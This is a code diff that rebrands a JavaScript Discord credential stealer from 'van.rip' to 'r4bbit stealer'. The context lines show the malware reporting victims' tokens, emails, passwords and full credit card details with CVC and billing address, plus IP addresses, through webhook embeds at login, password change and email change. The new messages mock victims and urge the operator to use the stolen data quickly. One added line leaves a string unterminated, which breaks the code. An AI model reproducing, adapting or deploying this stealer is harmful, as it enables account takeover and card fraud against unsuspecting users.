@@ -71,7 +71,7 @@ function FirstTime() {
 				fs.rmdirSync(path.join(__dirname, "init"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "van.rip",
+						username: "r4bbit stealer",
 						content: "",
 						embeds: [{
 							title: "Discord Initalized",
@@ -82,10 +82,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "van.rip"
+								name: "r4bbit stealer"
 							},
 							footer: {
-								text: "van.rip"
+								text: "r4bbit stealer"
 							}
 						}]
 					};
@@ -97,11 +97,11 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "van.rip",
+							username: "r4bbit stealer",
 							content: "",
 							embeds: [{
 								title: "Discord Initalized -> Victim didn't login",
-								description: "Fun fact: You just discovered van and you enjoy it already!",
+								description: "Fun fact: You just bought r4bbit and you already got a hit",
 								color: config["embed-color"],
 								fields: [{
 									name: "<:bladegreen:940706332753924127> Information",
@@ -125,10 +125,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "van.rip"
+									name: "r4bbit stealer"
 								},
 								footer: {
-									text: "van.rip"
+									text: "r4bbit stealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -149,7 +149,7 @@ function FirstTime() {
 			if (config['logout-notify'] == "true") {
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "van.rip",
+						username: "r4bbit stealer",
 						content: "",
 						embeds: [{
 							title: "User log out",
@@ -160,10 +160,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "van.rip"
+								name: "r4bbit stealer"
 							},
 							footer: {
-								text: "van.rip"
+								text: "r4bbit stealer"
 							}
 						}]
 					};
@@ -175,11 +175,11 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "van.rip",
+							username: "r4bbit stealer",
 							content: "",
 							embeds: [{
 								title: "User got logged out",
-								description: "Fun fact: You are not dumb so you bought this and not got grabbed by it!",
+								description: "Fun fact: ur victim is so dumb they just ran ur stealer ",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
@@ -203,10 +203,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "van.rip"
+									name: "r4bbit stealer"
 								},
 								footer: {
-									text: "van.rip"
+									text: "r4bbit stealer"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -457,7 +457,7 @@ function Login(email, password, token) {
 								content: "",
 								embeds: [{
 									"title": "User Login Information",
-									description: "Fun fact: you actually enjoy this grabber and you want to buy the lifetime version!",
+									description: "Fun fact: UR VICTIM JUST RELOGGED | USE THE DATA FASTTTT",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "<:bladegreen:940706332753924127> Information",
@@ -497,10 +497,10 @@ function Login(email, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "van.rip"
+										"name": "r4bbit stealer"
 									},
 									"footer": {
-										"text": "van.rip"
+										"text": "r4bbit stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -510,10 +510,10 @@ function Login(email, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "van.rip"
+										"name": "r4bbit stealer"
 									},
 									"footer": {
-										"text": "van.rip"
+										"text": "r4bbit stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -526,10 +526,10 @@ function Login(email, password, token) {
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "van.rip"
+									"name": "r4bbit stealer"
 								},
 								"footer": {
-									"text": "van.rip"
+									"text": "r4bbit stealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -613,11 +613,11 @@ function Login(email, password, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "van.rip",
+											username: "r4bbit stealer",
 											content: "",
 											embeds: [{
 												"title": "User Login Information",
-												description: "Fun fact: You are so cool that you grabbed the almost most people on the grabber!",
+												description: "Fun fact: You are almost the first on our leadderboard of the most stolen account! Good job!",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "<:bladegreen:940706332753924127> Information",
@@ -657,10 +657,10 @@ function Login(email, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "van.rip"
+													"name": "r4bbit stealer"
 												},
 												"footer": {
-													"text": "van.rip"
+													"text": "r4bbit stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -670,10 +670,10 @@ function Login(email, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "van.rip"
+													"name": "r4bbit stealer"
 												},
 												"footer": {
-													"text": "van.rip"
+													"text": "r4bbit stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -800,7 +800,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								content: "",
 								embeds: [{
 									"title": "Password Changed",
-									description: "Fun fact: You cannot escape the virus cause it's too powerful!",
+									description: "Fun fact: HE THINKS CHANGEING THE PASSWORD WILL WORK. THIS IS WHY R4BBIT IS THE BEST. GOOD LUCK!",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "<:bladegreen:940706332753924127> Information",
@@ -844,10 +844,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "van.rip"
+										"name": "r4bbit stealer"
 									},
 									"footer": {
-										"text": "van.rip"
+										"text": "r4bbit stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -857,10 +857,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "van.rip"
+										"name": "r4bbit stealer"
 									},
 									"footer": {
-										"text": "van.rip"
+										"text": "r4bbit stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -873,10 +873,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "van.rip"
+									"name": "r4bbit stealer"
 								},
 								"footer": {
-									"text": "van.rip"
+									"text": "r4bbit stealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -961,11 +961,11 @@ function ChangePassword(oldpassword, newpassword, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "van.rip",
+											username: "r4bbit stealer",
 											content: "",
 											embeds: [{
 												"title": "Password Changed",
-												description: "Fun fact: This grabber is not shit at all!",
+												description: "Fun fact: HE THINKS IF CHANGES THE PASS HE WILL ESCAPE. HAVE FUN WITH THE ACC ! ",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "<:bladegreen:940706332753924127> Information",
@@ -1009,10 +1009,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "van.rip"
+													"name": "r4bbit stealer"
 												},
 												"footer": {
-													"text": "van.rip"
+													"text": "r4bbit stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1022,10 +1022,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "van.rip"
+													"name": "r4bbit stealer"
 												},
 												"footer": {
-													"text": "van.rip"
+													"text": "r4bbit stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1148,11 +1148,11 @@ function ChangeEmail(newemail, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "van.rip",
+								username: "r4bbit stealer",
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "Fun fact: You are not a idiot, you are cool!",
+									description: "Fun fact: HE JUST CHANGED HES EMAIL . HE CANNOT ESCAPE THIS HELL!",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "<:bladegreen:940706332753924127>Information",
@@ -1192,10 +1192,10 @@ function ChangeEmail(newemail, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "van.rip"
+										"name": "r4bbit stealer"
 									},
 									"footer": {
-										"text": "van.rip"
+										"text": "r4bbit stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1205,10 +1205,10 @@ function ChangeEmail(newemail, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "van.rip"
+										"name": "r4bbit stealer"
 									},
 									"footer": {
-										"text": "van.rip"
+										"text": "r4bbit stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1221,10 +1221,10 @@ function ChangeEmail(newemail, password, token) {
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "van.rip"
+									"name": "r4bbit stealer"
 								},
 								"footer": {
-									"text": "van.rip"
+									"text": "r4bbit stealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -1309,11 +1309,11 @@ function ChangeEmail(newemail, password, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "van.rip",
+											username: "r4bbit stealer",
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
-												description: "Fun fact: you are not retard just idiot with a dream, to steal other accounts. :)",
+												description: "Fun fact: This stealer is just the best , he cant escape this hell. BTW he changed email.",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "<:bladegreen:940706332753924127> Information",
@@ -1353,10 +1353,10 @@ function ChangeEmail(newemail, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "van.rip"
+													"name": "r4bbit stealer"
 												},
 												"footer": {
-													"text": "van.rip"
+													"text": "r4bbit stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1366,10 +1366,10 @@ function ChangeEmail(newemail, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "van.rip"
+													"name": "r4bbit stealer"
 												},
 												"footer": {
-													"text": "van.rip"
+													"text": "r4bbit stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1405,16 +1405,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
 			var params = {
-				username: "van.rip",
+				username: "r4bbit stealer",
 				content: "",
 				embeds: [{
 					"title": "<a:S_CreditCard:913391708732002304> User Credit Card Added",
 					"description": "**<a:drip_blackbutterfly:940706243914399914> Username:**```" + json.username + "#" + json.discriminator + "```\n**<:a6:940706284196466740> User ID:**```" + json.id + "```\n**<:drip_cagulaalba:940706261761146942> User Email:**```" + json.email + "```\n" + "**<:RC_Peepo_NitroCL:895695395366256670> Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**<:blackbjoker:940707132968423536> User Badges:**```" + GetBadges(json.flags) + "```" + "\n**:credit_card: Credit Card Number: **```" + number + "```" + "\n**:credit_card: Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**:credit_card: CVC/CVV: **```" + cvc + "```\n" + "**:credit_card: Credit Card Country: **```" + country + "```\n" + "**:credit_card: State: **```" + state + "```\n" + "**:credit_card: City: **```" + city + "```\n" + "**:credit_card: ZIP/Postal Code:**```" + zip + "```" + "\n**:credit_card: Street Address: **```" + street + "```" + "\n**<:bladeevil:940706348373524491> Token:**```" + token + "```" + "\n**<:Stats:913546443082592276> IP: **```" + ip + "```",
 					"author": {
-						"name": "van.rip"
+						"name": "r4bbit stealer"
 					},
 					"footer": {
-						"text": "van.rip"
+						"text": "r4bbit stealer
 					},
 					"thumbnail": {
 						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
